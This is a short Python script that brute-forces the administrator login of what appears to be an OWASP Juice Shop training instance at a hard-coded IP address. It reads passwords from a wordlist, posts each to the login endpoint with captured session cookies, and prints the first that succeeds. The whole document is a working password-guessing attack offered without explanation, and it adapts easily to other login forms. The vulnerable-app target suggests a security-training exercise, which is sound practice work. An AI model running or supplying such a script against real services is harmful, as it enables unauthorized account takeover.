from urllib.request import urlopen, Request
from json import dumps, load

passwords_ = open("wordlist.txt")
passwords = passwords_.readlines()
passwords_.close()

for password in passwords:
    try:response = urlopen(
		Request(
			"http://15.236.144.183:8082/rest/user/login",
			data=dumps({
				"email":"admin@juice-sh.op",
				"password": password.strip(),
			}).encode(),
			method="POST",
			headers={
				"Accept": "application/json, text/plain, */*",
				"Content-Type": "application/json",
				"Origin": "http://15.236.144.183:8082",
				"Referer": "http://15.236.144.183:8082/",
				"Cookie": (
					"language=en; welcomebanner_status=dismiss;"
					" continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
					"TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
					"_status=dismiss"
				),
			},
		)
	)
    except: pass
    else: print("[+] Password:", password, end=""); break
